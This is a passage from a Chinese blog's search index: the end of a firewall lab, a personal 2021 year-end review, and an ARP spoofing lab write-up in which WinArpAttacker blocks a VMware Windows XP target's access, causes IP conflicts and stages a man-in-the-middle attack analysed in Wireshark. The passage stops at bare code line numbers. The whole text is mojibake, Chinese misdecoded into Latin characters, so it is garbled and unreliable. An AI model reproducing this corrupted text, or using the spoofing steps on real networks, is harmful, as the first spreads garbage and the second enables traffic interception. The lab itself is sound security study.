æ­¤æ—¶æˆ‘ä»¬çš„å®¢æˆ·ç«¯å†åº¦è®¿é—®æˆ‘ä»¬çš„Linux FTP æœåŠ¡å™¨ç«¯\nå¯ä»¥çœ‹åˆ°æˆ‘ä»¬æ­¤æ—¶å·²ç»æ— æ³•è®¿é—®è¯¥æ–‡ä»¶å¤¹äº†ã€‚æ— æ³•è®¿é—®åˆ°æˆ‘ä»¬çš„LinuxæœåŠ¡å™¨ 0x05 å®éªŒç»“è®º é€šè¿‡å¯¹Windowsä¸‹å’ŒLinuxä¸‹é˜²ç«å¢™çš„é…ç½®æƒ…å†µï¼Œè‡ªå·±äº²è‡ªç¼–å†™é˜²ç«å¢™çš„ç›¸å…³è§„åˆ™ï¼Œå¯¹åŒ…è¿‡æ»¤é˜²ç«å¢™æœ‰äº†è¿›ä¸€æ­¥çš„äº†è§£å’Œè®¤çŸ¥ã€‚åŒæ—¶é’ˆå¯¹ä¸åŒç¯å¢ƒä¸‹é˜²ç«å¢™é…ç½®ï¼ŒLinuxä¸‹çš„é˜²ç«å¢™é…ç½®åº”è¯¥æ¯”Windwosæ›´ä¸ºè‡ªç”±ï¼Œè‡ªå®šä¹‰çš„æ¯”è¾ƒå¤šã€‚ ","permalink":"http://www.reus09.top/posts/tech/%E9%98%B2%E7%81%AB%E5%A2%99%E5%AE%9E%E9%AA%8C/","summary":"é˜²ç«å¢™å®éªŒ 0x01 å®éªŒç›®æ ‡ é€‰æ‹©ä¸€ç§ä¸»æµçš„è½¯ä»¶é˜²ç«å¢™ï¼Œç†Ÿæ‚‰å…¶å®‰å…¨è§„åˆ™é…ç½®ï¼Œé€šè¿‡é…ç½®é˜²ç«å¢™è§„åˆ™ï¼Œå®ç°ä»¥ä¸‹åŠŸèƒ½ï¼š è¿‡æ»¤è¿œç¨‹æœåŠ¡å™¨ï¼ˆRï¼‰åˆ°æœ¬åœ°ä¸»æœºï¼ˆLï¼‰çš„T","title":"é˜²ç«å¢™å®éªŒ"},{"content":"2021 å°ç»“ å½“ä¸€ä¸ªäººååœ¨ç©ºæ— ä¸€äººçš„å®¿èˆé‡Œï¼Œä¹Ÿè®¸æ˜¯æ— èŠå§ï¼Œä¹Ÿè®¸æ˜¯çœ¼æ…•æœ‹å‹åœˆæ»¡å¤©é£çš„è·¨å¹´å°ç»“ï¼Œä¹Ÿè®¸æ˜¯çœ‹å„ç§æ¨é€çš„å¹´åº¦æ€»ç»“æœ‰æ„Ÿï¼Œå› æ­¤æ€»æƒ³å†™ç‚¹ä»€ä¹ˆä¸œè¥¿ï¼Œç‰¹åˆ«æ˜¯åœ¨è¿™ç§å­¤å•çš„æ°”æ°›ä¸­ï¼Œè¿™ç§æ„Ÿè§‰å¾ˆéš¾å½¢å®¹ï¼Œæ€»æƒ³æç¬”å€¾è¯‰ä¸€ç‚¹ä¸œè¥¿ï¼Œä¸åä¸å¿«ã€‚ 2021å¹´æ€»çš„æ¥è¯´ï¼ŒæˆåŠŸé—æ†¾å‚åŠã€‚å¦‚æœ2021å¹´åº¦æ€»åˆ†ååˆ†çš„è¯ï¼Œæˆ‘åªèƒ½æ‰“åˆ°7åˆ†ã€‚ è¿™å¤§æ¦‚æ˜¯æœ¬äººç¬¬ä¸€æ¬¡ä¸ªäººå¹´åº¦å°ç»“ï¼Œå½“ç„¶ä¹Ÿæ²¡äººçœ‹ï¼Œä¹Ÿå°±éšä¾¿å†™å†™è‡ªå·±ç›¸å¯¹è‡ªå·±æƒ³è¯´çš„è¯ã€‚ 2021å¹´åº¦çš„æ”¶è· å½“ç„¶è¯´èµ·æ”¶è·ï¼Œè‡ªç„¶æ˜¯è¿™ä¸ªå†™ä½œçš„å¹³å°åšå®¢äº†ã€‚ æ¢åº—åŒ—äº¬ç¾é£Ÿã€‚ åœ¨Lordä½¬çš„å¸¦é£ä¸‹ï¼Œæ‹¿ä¸ªå¤©èä¿¡å°å¥–é¡¹ã€‚ æ”¶è·ä¸€æ‰¹å¾ˆä¸é”™çš„è¶³çƒå°ä¼™ä¼´ã€‚æœ€åä¹Ÿæ‹¿äº†ä¸€ä¸ªç½‘å®‰é™¢çš„å°è¶³çƒæ¯”èµ›çš„å† å†›ã€‚ å»é€›äº†ä»å°åˆ°å¤§ä¹¦æœ¬é‡Œè®°è½½é‡Œçš„é•¿åŸï¼Œåˆæ˜¥æ—¶åˆ»ï¼Œçœ‹å·å³¨çš„é•¿åŸå´å²–èœ¿èœ’ã€‚ åœ¨å­¦ä¸šä¸Šæœ‰äº†ç›¸å½“ç¨‹åº¦çš„ç²¾è¿›ï¼Œå¤§ä¸€æ—¶å€™å­˜åœ¨ä¸€å®šçš„æ‘†çƒ‚ï¼Œå› æ­¤å¤§ä¸€çš„æˆç»©ä¸ä¿ç ”æ— æœ›ï¼ŒåŒæ—¶äººé™…äº¤å¾€è¾ƒå°‘ï¼Œä½†æ˜¯å¤§äºŒé€šè¿‡æ‹…ä»»ç­çº§å­¦å§”ï¼Œå¯ä»¥è¯´æå¤§æ‹“å±•äº†äº¤å¾€çš„æœ‹å‹åœˆï¼Œä¹Ÿè®¤è¯†äº†å¯ä»¥ä¸€äº›å¯ä»¥ç›¸è¯†çš„æœ‹å‹ï¼Œæˆç»©ä¹Ÿæœ‰äº†ä¸€äº›å°çªç ´ï¼Œå¯ä»¥è¯´æ¯”è¾ƒæ¥è¿‘ä¿ç ”çš„åé¢ã€‚ äººé™…äº¤å¾€æ–¹é¢ï¼Œä¸ªäººæ€§æ ¼çš„ç¼ºç‚¹ç›¸å½“ä¸¥é‡ï¼Œè‡ªå‘å§ï¼Œä¹Ÿè®¸åªèƒ½åœ¨ç†Ÿäººé¢å‰èƒ½å¤Ÿå€¾åè‡ªå·±çš„æƒ³æ³•ï¼Œä½†æ˜¯è¿™ç§è®²è¯çš„æ–¹å¼å´åˆååˆ†çš„ä¸‘é™‹ï¼Œå¾€å¾€ä¼šæƒ¹å¾—å…¶ä»–äººä¸æ»¡ï¼Œç„¶åè‡ªå·±ä¹Ÿç›¸å½“ä¸çˆ½ï¼Œä½†æ˜¯è‡ªå·±ä¹Ÿåªèƒ½æŠŠæ‰€æœ‰å¿ƒäº‹åŸ‹åœ¨å¿ƒé‡Œï¼Œè‡ªå·±ä¸æ–­åœ°åæ€è‡ªå·±çš„é—®é¢˜ï¼Œä¹Ÿè®¸å°±æ˜¯è°¨è¨€æ…è¡Œå§ï¼Œè¯´è¯è¦æ‡‚å¾—ç¬¦åˆäº‹å®œã€ä¸èƒ½æ»¡å˜´è·‘ç«è½¦ï¼Œè¯´è¯æ–¹å¼ä¹Ÿæœ‰äº†æå¤§åœ°æ”¹å–„ã€‚ æ€§æ ¼æ–¹é¢ï¼Œè¿™ä¸€å¹´åº”è¯¥è¯´æˆé•¿äº†ä¸å°‘ï¼Œå› ä¸ºä»å°æ¥å—æ•™è‚²æ¯”è¾ƒå°é—­çš„é—®é¢˜ï¼Œåˆä¸­é«˜ä¸­çš„æ²Ÿé€šæ¯”è¾ƒå°‘ï¼Œå†…å‘è¿˜æ˜¯æœ‰çš„ã€‚è¿™ä¸€å¹´é€šè¿‡ä¸€äº›äº¤æµã€å¤–å‡ºæ¸¸ç©æ€§æ ¼åº”è¯¥æ˜¯å¼€æ”¾äº†ä¸€ç‚¹ã€æ•¢è¯´ï¼Œä¸å†æ˜¯è‡ªé—­å„¿ç«¥äº†ã€‚å…¶å®å§ï¼Œäººåº”è¯¥è‡ªä¿¡ä¸€ç‚¹ã€‚ æŠ€æœ¯æ–¹é¢ï¼šå­¦äº†çˆ¬è™«ã€ç®€å•çš„webå‰ç«¯ã€phpã€è¿˜æœ‰ä¸€äº›CTFçš„æ–¹å‘ã€‚ ç”Ÿæ´»ä¹ æƒ¯ï¼šç›¸å½“ä¸è‡ªå¾‹ï¼Œå¤§ä¸‰ä¸Šçš„åŠå¹´ä¸­æ¯æ™šå¹³å‡éƒ½æ˜¯ä¸€ç‚¹åŠä¹‹åç¡è§‰ï¼Œå¤§éƒ¨åˆ†éƒ½æ˜¯äºŒç‚¹ä¹‹åæ‰æµ‘æµ‘å™©å™©çš„ç¡ç€ï¼Œæ˜¼å¤œä½œæ¯æåº¦ç´Šä¹±ï¼Œæ—©é¤åŸºæœ¬åŠå¹´æ²¡åƒè¿‡ä¸€æ¬¡ã€‚ BVBï¼Œç½—ä¼Šæ–¯æ‹¿ä¸‹äººç”Ÿä¸­ç¬¬ä¸€ä¸ªæ¯”è¾ƒé‡è¦çš„å† å†›å¤´è¡”ï¼šå¾·å›½æ¯ã€‚ 2021å¹´çš„é—æ†¾ æœ€å¤§çš„é—æ†¾åº”è¯¥æ˜¯å¤§å­¦ä¸¤å¹´åŠï¼Œå´ä»æœªå»è¿‡å·ç§°æ–‡åŒ–ç²¾åçš„æ•…å®«ï¼Œæ€»æ˜¯ä»¥å„ç§å„æ ·çš„åŸå› é¸½äº†æ•…å®«ï¼Œè¿™é‡Œç«‹ä¸€ä¸ªflag:2022å¹´åº¦æ— è®ºå¦‚ä½•éƒ½è¦çœ‹ä¸€çœ‹æ•…å®«çš„æ¨¡æ ·ã€‚ è¿˜æœ‰é—æ†¾å°±æ˜¯ï¼Œå¤§å­¦ç¬¬ä¸€æ¬¡ç›¸å¯¹æ­£å¼çš„è¶³çƒæ¯”èµ›ï¼Œæ ¡é•¿æ¯è¡¨ç°ç›¸å½“ç³Ÿç³•ï¼Œä¹Ÿè®¸ä¸€ç”Ÿä¸­ä¹Ÿå¾ˆéš¾å¿˜è®°è¿™åœºæ¯”èµ›ï¼Œæ€»è€Œè¨€ä¹‹ï¼Œå°±æ˜¯å¿ƒæ€ç³Ÿç³•ï¼ŒæŠ€æœ¯ç³Ÿç³•ã€‚ è¿˜æœ‰å°±æ˜¯å¯¹äºæƒ³å­¦çš„æŠ€æœ¯å¾€å¾€ä¸èƒ½åšæŒåˆ°åº•ï¼Œæ„å¿—åŠ›ä¸å¤Ÿå¼ºå¤§ï¼Œä¸€ç›´å¯¹ç½‘ç»œå®‰å…¨æ–¹é¢çš„çŸ¥è¯†æ„Ÿå…´è¶£ï¼Œä½†æ˜¯æ€»æ˜¯ä¸‰å¿ƒäºŒæ„ã€‚ åœ¨ç›¸è¯†çš„äººä¸­ï¼Œèµ°ä¸¢äº†ä¸€äº›äººã€‚ä¹Ÿè®¸è¿™å°±æ˜¯äººç”Ÿå§ï¼Œå½“æœ‰äººæ„è§ä¸ä½ æƒ³å·¦çš„æ—¶å€™ï¼Œä½ ä¸èƒ½å¼ºè¿«æ‰€æœ‰äººéƒ½èƒ½è¾¾æˆå…±è¯†ï¼Œä¸æ˜¯æ‰€æœ‰äººçš„ä¸‰è§‚éƒ½æ˜¯ç›¸åŒçš„ï¼Œæ€»æœ‰äººè¦ä¸‹è½¦ï¼Œä¹Ÿæ€»æœ‰äººè¦ä¸Šè½¦ï¼Œé™è§‚å…¶å˜ï¼Œéšå…¶é£å»å§ã€‚ æœ¬å­¦æœŸçš„ç›¸å½“ä¸€éƒ¨åˆ†ä½œä¸šä¸ºå°ç»„åˆä½œå½¢å¼ï¼Œå¾€å¾€ä¸èƒ½å¤Ÿæ­£å¸¸çš„åˆ†å·¥ã€åˆä½œã€å›¢é˜Ÿæ„è¯†è¿˜æ˜¯æ¬ ç¼ºã€‚ è¿˜æœ‰å°±æ˜¯å¯¹äºæƒ³è¦çš„ä¸æ•¢ç›´è¯´ï¼Œ(è¿™å°±æ˜¯å«è“„ï¼Ÿ)ï¼Œæ¯«æ— ç–‘é—®ï¼Œè¿™ä¸¢æ‰äº†ä¸€å¤§å †æƒ³è¦çš„ä¸œè¥¿ï¼Œå¯æœ›è€Œä¸å¯å³ã€‚ å¯¹äºå­¦å§”çš„å·¥ä½œï¼Œæœ‰ä¸€ç‚¹ç–²å€¦ï¼Œå¦‚æœå¯ä»¥ï¼Œä»»æœŸæ»¡çš„æ—¶å€™è€ƒè™‘è¾èŒã€‚ å¤§ä¸‰ä¸Šçš„åŠå¹´è¯¾è®¤è¯†åˆ°äº†é™¢é‡Œè€å¸ˆçš„ä¸€äº›æ°´å¹³ï¼Œæ˜¯æ—¶å€™è€ƒè™‘å¾€æ›´å¤§çš„æ–¹å‘è€ƒè™‘ã€‚ 2022 å¸Œæœ› 1ã€å»ä¸€æ¬¡æ•…å®« 2ã€åŠªåŠ›å­¦ä¹ æŠ€æœ¯ï¼Œæ‹¿åˆ°ä¸€ä¸ªå¿ƒä»ªçš„å®ä¹ offer 3ã€ç»§ç»­ä¸“å¿ƒå­¦ä¹ ï¼Œç¡®ä¿å­¦ä¸šèƒ½å¤Ÿæ‹¿åˆ°ä¿ç ”èµ„æ ¼ 4ã€å¯¹è¶³çƒæ›´ä¸Šå¿ƒå§ï¼Œç»ƒç»ƒæŠ€æœ¯ã€æ‹‰æ‹‰ä½“èƒ½ï¼Œäº‰å–èƒ½åœ¨æ ¡é•¿æ¯ä¸Šåœºå§ï¼Œæœ‰æ‰€è¡¨ç°å§ã€‚ 5ã€ç»§ç»­ç›®å‰çš„äººé™…äº¤å¾€ï¼Œå¦‚æœå¯ä»¥ï¼Œå¯ä»¥è®¤è¯†æ›´å¤šçš„æœ‹å‹ã€‚ 6ã€å»æ›´å¤šçš„åœ°æ–¹æ¸¸ç©ï¼Œå¸Œæœ›äº”ä¸€æˆ–å›½åº†å‡æœŸåˆ°å†…è’™æˆ–è€…é•¿æ²™ç©ä¸€æ¬¡ã€‚ æ€»ç»“ æ€»è€Œè¨€ä¹‹ï¼Œå°±æ˜¯ä»¥ä¸Šäº†ï¼Œè¿˜æ˜¯å¤ªçŸ«æƒ…äº†ï¼Œä½†æ˜¯å§ï¼Œäººæ€»è¦å€¾åä¸€ç‚¹ä¸œè¥¿ï¼Œ2021å°±è¿™æ ·å§ï¼Œ2021å°±åˆ°è¿™é‡Œäº†ã€‚\nå¸Œæœ›2022ä¼šæ›´å¥½ã€‚\n","permalink":"http://www.reus09.top/posts/life/2021%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/","summary":"2021 å°ç»“ å½“ä¸€ä¸ªäººååœ¨ç©ºæ— ä¸€äººçš„å®¿èˆé‡Œï¼Œä¹Ÿè®¸æ˜¯æ— èŠå§ï¼Œä¹Ÿè®¸æ˜¯çœ¼æ…•æœ‹å‹åœˆæ»¡å¤©é£çš„è·¨å¹´å°ç»“ï¼Œä¹Ÿè®¸æ˜¯çœ‹å„ç§æ¨é€çš„å¹´åº¦æ€»ç»“æœ‰æ„Ÿï¼Œå› æ­¤æ€»æƒ³å†™ç‚¹ä»€ä¹ˆä¸œè¥¿ï¼Œç‰¹","title":"2021å¹´åº¦æ€»ç»“"},{"content":"ARPæ¬ºéª—å®éªŒ 0x01 å®éªŒå‰æçŸ¥è¯† ARPåè®®çš„å®‰å…¨é—®é¢˜ ARPåè®®æ˜¯å»ºç«‹åœ¨ä¿¡ä»»å±€åŸŸç½‘å†…æ‰€æœ‰ç»“ç‚¹çš„åŸºç¡€ä¸Šçš„ï¼Œå®ƒé«˜æ•ˆï¼Œä½†å´ä¸å®‰å…¨ã€‚\nARPé«˜é€Ÿç¼“å­˜æ ¹æ®æ‰€æ¥æ”¶åˆ°çš„ARPåè®®åŒ…éšæ—¶è¿›è¡ŒåŠ¨æ€æ›´æ–°ï¼Œå®ƒæ˜¯æ— çŠ¶æ€çš„åè®®ï¼Œä¸ä¼šæ£€æŸ¥è‡ªå·±æ˜¯å¦å‘è¿‡è¯·æ±‚åŒ…ï¼Œåªè¦æ”¶åˆ°ç›®æ ‡MACæ˜¯è‡ªå·±çš„ARPå“åº”æ•°æ®åŒ…æˆ–ARPå¹¿æ’­åŒ…ï¼Œéƒ½ä¼šæ¥å—å¹¶ç¼“å­˜ã€‚\nARPåè®®æ²¡æœ‰è®¤è¯æœºåˆ¶ï¼Œåªè¦æ¥æ”¶åˆ°çš„åè®®åŒ…æ˜¯æœ‰æ•ˆçš„ï¼Œä¸»æœºå°±æ— æ¡ä»¶åœ°æ ¹æ®åè®®åŒ…çš„å†…å®¹åˆ·æ–°æœ¬æœºARPç¼“å­˜ï¼Œå¹¶ä¸æ£€æŸ¥è¯¥åè®®åŒ…çš„åˆæ³•æ€§ã€‚\nå› æ­¤æ”»å‡»è€…å¯ä»¥éšæ—¶å‘é€è™šå‡ARPåŒ…æ›´æ–°è¢«æ”»å‡»ä¸»æœºä¸Šçš„ARPç¼“å­˜ï¼Œè¿›è¡Œåœ°å€æ¬ºéª—æˆ–æ‹’ç»æœåŠ¡æ”»å‡»ã€‚\nARP Reply Spoofing æ„é€ è™šå‡çš„ARPå“åº”åŒ…ï¼Œç¯¡æ”¹ç›®æ ‡ä¸»æœºçš„MACåœ°å€ï¼Œä¾‹ï¼š\nå¹¿æ’­æ”»å‡» å½“æ•°æ®åŒ…çš„ç›®æ ‡MACåœ°å€ä¸ºFF:FF:FF:FF:FF:FFï¼Œè¯¥æ•°æ®åŒ…å°†ä¼šè¢«å¹¿æ’­ã€‚æ„é€ å“åº”åŒ…ï¼Œå…¶ä¸­åè®®åœ°å€ä¸ºç½‘å…³IPï¼Œè€ŒMACåœ°å€ä¸ºå¹¿æ’­åœ°å€ï¼Œå°†è¿™æ ·çš„å“åº”åŒ…å‘ç»™å±€åŸŸç½‘å†…ä¸»æœºã€‚é‚£ä¹ˆï¼Œå±€åŸŸç½‘ä¸»æœºå‘ç»™ç½‘å…³çš„æ•°æ®åŒ…éƒ½å°†è¢«å¹¿æ’­ã€‚è¿™æ—¢æ˜¯ä¸€ç§å—…æ¢æ–¹æ³•ï¼Œä¹Ÿå¯ä½œä¸ºå¹²æ‰°ç½‘ç»œæœåŠ¡çš„æ”»å‡»æ–¹æ³•ã€‚ æ‹’ç»æœåŠ¡æ”»å‡» æ„é€ è™šå‡å“åº”åŒ…ï¼Œå…¶ä¸­åè®®åœ°å€ä¸ºå…³é”®æœåŠ¡çš„IPåœ°å€ï¼Œä¾‹å¦‚ç½‘å…³ï¼Œè€ŒMACåœ°å€ä¸ºä¸å­˜åœ¨çš„è™šå‡åœ°å€ï¼Œå°†è¿™æ ·çš„å“åº”åŒ…å‘ç»™å±€åŸŸç½‘å†…ä¸»æœºã€‚é‚£ä¹ˆï¼Œå±€åŸŸç½‘ä¸»æœºå‘ç»™å…³é”®æœåŠ¡ï¼ˆå¦‚ç½‘å…³ï¼‰çš„æ•°æ®åŒ…éƒ½å°†ä¸¢å¤±ï¼Œä»è€Œå½¢æˆæ‹’ç»æœåŠ¡æ”»å‡»ã€‚ ä¸­é—´äººæ”»å‡» 0x02 å®éªŒå·¥å…·åŠç¯å¢ƒ éƒ¨ç½²äºåŒä¸€å±€åŸŸç½‘ä¸‹ï¼ŒVmwareå†…éƒ¨çš„ä¸¤å°Winxp ä»¥åŠ ä¸»æœº çš„ä¸‰å°æœºå™¨ æ”»å‡»æœº win xp IP: 192.168.195.131 MAC : 00-0c-29-06-65-c9 é¶æœº win xp IP : 192.168.185.138 MAC : 00-0c-29-19-ba-6e win 10 IP : 192.168.195.1 MAC : 00-50-56-c0-00-08 ç½‘å…³ IP : 192.168.195.2 MAC : 00-50-56-e7-d4-22 å·¥å…· WinArpAttacker visual studio 19 wireshark 0x03 ä½¿ç”¨åœ¨çº¿å·¥å…·WinArpAttacker ç¦æ­¢ä¸Šç½‘åŠŸèƒ½ é¶æœº IP ï¼š 192.168.185.138\næœªè¿›è¡Œç¦æ­¢ä¸Šç½‘å‰çš„ é¶æœºçŠ¶æ€ï¼Œå¯ä»¥æ­£å¸¸ä¸Šç½‘\nåœ¨WinArpAttackerå·¥å…·ä¸­é€‰å–é¶æœºIPï¼š192.168.185.138 è¿›è¡Œç¦æ­¢ä¸Šç½‘æ”»å‡»\nå‘ç°æ­¤æ—¶çš„ç½‘ç«™åˆ·æ–°åæ— æ³•æ‰“å¼€ï¼Œå¹¶ä¸” è¯¥é¶æœº ä¸ ç½‘å…³ 192.168.195.2çš„MAC åœ°å€è¢«ç¯¡æ”¹ä¸º 01-01-01-01-01-01\nåˆ©ç”¨WiresharkæŠ“å–ç¦æ­¢ä¸Šç½‘çš„æµé‡åŒ…\næŠ“è·åˆ°ä¸¤æ¡arpæ•°æ®åŒ… åˆ†æç¬¬ä¸€ä¸ªarpæ•°æ®åŒ… æºMAC è¢«è®¾ç½®ä¸º é”™è¯¯çš„MACåœ°å€ :01-01-01-01-01-01 (è¯¥MACåœ°å€ä¸ä¼šè¢«ç”¨åˆ°) æºIP ä¸ºé¶æœº çš„IP : 192.168.195.138 ç›®çš„ MAC å’Œ ç›®çš„ IP å‡æŒ‡å‘æ­£ç¡®çš„ ç½‘å…³ IP å’Œåœ°å€ ç”±æ­¤ ç½‘å…³ä¸­å­˜å–çš„ARP è¡¨ä¸­ é¶æœºIP 192.168.195.138 å¯¹åº”çš„MAC åœ°å€è¢«æ›´æ–°ä¸º 01-01-01-01-01-01 åˆ†æç¬¬äºŒä¸ªæ•°æ®åŒ… æºMAC è¢«è®¾ç½®ä¸º é”™è¯¯çš„MACåœ°å€ :01-01-01-01-01-01 (è¯¥MACåœ°å€ä¸ä¼šè¢«ç”¨åˆ°) æºIP ä¸º ç½‘å…³ çš„IP : 192.168.195.2 ç›®çš„ MAC å’Œ ç›®çš„ IP å‡æŒ‡å‘æ­£ç¡®çš„ é¶æœºï¼ˆ192.168.195.138ï¼‰ IP å’Œåœ°å€ ç”±æ­¤ é¶æœºä¸­å­˜å–çš„ARP è¡¨ä¸­ ç½‘å…³IP 192.168.195.2 å¯¹åº”çš„MAC åœ°å€è¢«æ›´æ–°ä¸º 01-01-01-01-01-01 ç”±æ­¤å®ç°äº† ç½‘å…³å’Œé¶æœº(192.168.195.138) ä¹‹é—´çš„MACåœ°å€å‡ä¸ºé”™è¯¯çš„ç›®æ ‡æœºMACåœ°å€ï¼Œå½“é¶æœºè®¿é—®å¤–ç½‘çš„æ—¶å€™ï¼ŒMACæ— æ³•è®¿é—®æ­£ç¡®çš„ç½‘å¡ï¼ŒåŒæ—¶ç½‘å…³ä¹Ÿæ— æ³•è®¿é—® é¶æœºï¼Œä»è€Œæ— æ³•ä¸å¤–ç½‘æ•°æ®ç›¸åŒï¼Œä»è€Œæ— æ³•ä¸Šç½‘ã€‚\nIPå†²çªåŠŸèƒ½ é¶æœºIP : 192.168.195.138\næœªè¿›è¡ŒIPå†²çªå‰ï¼Œé¶æœºå¯ä»¥æ­£å¸¸ä¸Šç½‘\nåœ¨WinArpAttackerå·¥å…·ä¸­é€‰å–é¶æœºIPï¼š192.168.185.138 è¿›è¡Œå®šæ—¶IPå†²çªå’Œ ä¸æ–­IP å†²çªã€‚\nåœ¨é¶æœºè§‚å¯Ÿåˆ°ï¼Œç³»ç»Ÿäº§ç”Ÿæé†’ï¼š\nIPåœ°å€ä¸ç½‘ç»œä¸Šçš„å…¶ä»–ç³»ç»Ÿæœ‰å†²çªã€‚ ç”¨Wiresharkåˆ†åˆ«æŠ“åŒ… å®šæ—¶IPå†²çªå’Œä¸æ–­IPå†²çª\nå®šæ—¶IPå†²çª ä¸æ–­IPå†²çª å¯ä»¥å‘ç°ä¸æ–­IPå†²çªå³ä¸ºå°†å®šæ—¶IPå†²çªå‘é€çš„ARPåŒ… è¿ç»­å‘é€ 1000æ¬¡ å½¢æˆæ´ªæ³›æ”»å‡»è€Œå·²ã€‚\nå› æ­¤è¿™é‡Œåªéœ€è¦åˆ†æIPå†²çªçš„ ä¸€ä¸ªARP åŒ…å³å¯ã€‚\næºMAC è¢«è®¾ç½®ä¸º é”™è¯¯çš„MACåœ°å€ :01-01-01-01-01-01 (è¯¥MACåœ°å€ä¸ä¼šè¢«ç”¨åˆ°) æºIP ä¸ºé¶æœº çš„IP : 192.168.195.138 ç›®çš„ MAC å’Œ ç›®çš„ IP å‡æŒ‡å‘æ­£ç¡®çš„ é¶æœºï¼ˆ192.168.195.138ï¼‰ IP å’Œåœ°å€ ç”±æ­¤ç›¸å½“äºï¼Œé¶æœºå‘è‡ªèº«å‘é€äº†å¤§é‡MACåœ°å€ä¸ºé”™è¯¯åœ°å€01-01-01-01-01-01çš„ARPåŒ…ï¼Œä»è€Œå¼•èµ·IPå†²çªï¼Œä½¿é¶æœºæ— æ³•ä¸Šç½‘\nä¸­é—´äººæ”»å‡» å®ç°ç”¨æ”»å‡»æœº(IP:192.168.195.131) æ£€æµ‹ é¶æœº(IP:192.168.195.1) ping é¶æœº(IP : 192.168.195.138)\næ²¡æœ‰ç”¨ä¸­é—´äººæ”»å‡»å‰\nä¸»æœºping é¶æœº(192.168.195.138 ) å¯ä»¥çœ‹åˆ°é€Ÿåº¦å¾ˆ\nä¸»æœºwin 10 çš„ ARP è¡¨å¯¹åº”åœ°å€\né¶æœº win xp çš„ ARPè¡¨å¯¹åº”MAC\nå¯ä»¥çœ‹åˆ°ä¸»æœºwin10 å’Œ é¶æœºxp ä¹‹é—´çš„mac å¯¹åº”å…³ç³»æ­£ç¡®ã€‚\nåœ¨WinArpAttackerå·¥å…·ä¸­é€‰å–é¶æœºIPï¼š192.168.185.138 å’Œä¸»æœºwin10 IP (192.168.195.1) è¿›è¡Œç›‘ç®¡ä¸»æœºé€šè®¯\næ­¤æ—¶å†åº¦ç”±ä¸»æœºwin10 ping é¶æœº win xp\nå¯ä»¥å¾ˆæ˜æ˜¾çš„çœ‹åˆ° ping å‘é€çš„æ—¶é—´é—´éš”å¤§å¹…åº¦å˜é•¿ã€‚\nä¸æ­¤åŒæ—¶ï¼Œä¸»æœºWIN10çš„ARPè¡¨ ç›®æ ‡é¶æœºip(192.168.195.138)çš„MAC åœ°å€è¢«ç¯¡æ”¹ä¸º æ”»å‡»æœºIP(192.168.195.131)çš„MACåœ°å€ã€‚\nç›¸åº”çš„ï¼Œç›®æ ‡é¶æœº(IP192.168.195.138) çš„ARPè¡¨ ä¸­å¯¹åº” ä¸»æœº(IP192.168.195.1)çš„MACåœ°å€ä¹Ÿè¢«ç¯¡æ”¹ä¸ºæ”»å‡»æœºIP(192.168.195.131)çš„MACåœ°å€ã€‚\nä»¥ä¸Šå°±æ˜¯ ä¸­é—´äººæ”»å‡»ä¹‹åçš„ æ•ˆæœã€‚\nä¸‹é¢åˆ©ç”¨wiresharkè¿›è¡ŒæŠ“åŒ…ï¼Œåˆ†æARPæ•°æ®åŒ…çš„æµç¨‹ã€‚\næŠ“è·åˆ°ä¸¤ä¸ªarpæ•°æ®åŒ…\nç¬¬ä¸€ä¸ªarpæ•°æ®åŒ…\næºMAC è¢«è®¾ç½®ä¸º æ”»å‡»æœºçš„MAC åœ°å€ :00-0c-29-06-65-c9 æºIP ä¸ºé¶æœº çš„IP : 192.168.195.138 ç›®çš„ MAC å’Œ ç›®çš„ IP å‡æŒ‡å‘æ­£ç¡®çš„ ä¸»æœºwin10 çš„ IP å’Œåœ°å€ ç”±æ­¤ä¸»æœºwin10 ä¸­ çš„arpè¡¨ï¼ŒæŒ‡å‘ç›®æ ‡é¶æœº(IP192.168.195.138)çš„macåœ°å€è¢«ç¯¡æ”¹ä¸º æ”»å‡»æœº(IP : 192.168.195.138)çš„MACåœ°å€ï¼Œå› æ­¤ä¸»æœºwin10å‘é€ç»™é¶æœºçš„æ•°æ® å‡å› ä¸ºmacåœ°å€è¢«å‘é€åˆ° æ”»å‡»æœºä¸Šé¢ã€‚ ç¬¬äºŒä¸ªarpæ•°æ®åŒ…\næºMAC è¢«è®¾ç½®ä¸º æ”»å‡»æœºçš„MAC åœ°å€ :00-0c-29-06-65-c9 æºIP ä¸ºé¶æœº çš„IP : 192.168.195.1 ç›®çš„ MAC å’Œ ç›®çš„ IP å‡æŒ‡å‘æ­£ç¡®çš„ é¶æœº win xp çš„ IP å’Œåœ°å€ ç”±æ­¤é¶æœº win xp ä¸­ çš„arpè¡¨ï¼ŒæŒ‡å‘ä¸»æœº(IP192.168.195.1)çš„macåœ°å€è¢«ç¯¡æ”¹ä¸º æ”»å‡»æœº(IP : 192.168.195.138)çš„MACåœ°å€ï¼Œå› æ­¤åŒæ ·é¶æœºwin xp å‘ç»™ ä¸»æœºwin 10 çš„æ•°æ®æµä¹Ÿä¼šè¢«å…ˆå‘ç»™ æ”»å‡»æœºã€‚ æ€»è€Œè¨€ä¹‹ï¼Œä¸­é—´äººæ”»å‡»å³ä¸º\næ”»å‡»è€…å‘ç›®æ ‡å‘é€è™šå‡åº”ç­”åŒ…ï¼Œå‘Šè¯‰ä¸»æœºAâ€œä¸»æœºBçš„MACåœ°å€æ˜¯MacCï¼ˆæ”»å‡»è€…MACï¼‰â€ï¼Œå‘Šè¯‰ä¸»æœºBâ€œä¸»æœºAçš„MACåœ°å€æ˜¯MacCï¼ˆæ”»å‡»è€…MACï¼‰â€\næˆåŠŸåï¼Œä¸»æœºAå‘é€ç»™ä¸»æœºBçš„æ•°æ®åŒ…è¢«è½¬å‘ç»™ä¸»æœºCï¼Œä¸»æœºBå‘é€ç»™ä¸»æœºAçš„æ•°æ®åŒ…ä¹Ÿè¢«è½¬å‘ç»™ä¸»æœºCï¼Œ\näºæ˜¯Aã€Bä¹‹é—´çš„æ•°æ®å‡è¢«Cå—…æ¢ã€‚æ”»å‡»è€…Cä¼šè½¬å‘é‡å®šå‘åˆ°è‡ªå·±çš„æ•°æ®åŒ…åˆ°æ­£ç¡®ä½ç½®ï¼Œå› æ­¤Aå’ŒBæ²¡æœ‰å¯Ÿè§‰åˆ°å—…æ¢çš„å­˜åœ¨ã€‚\n0x04 åŸºäºWinpcap å¯¹æŒ‡å®šç›®æ ‡IPè¿›è¡ŒARPæ¬ºéª—æ”»å‡» 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 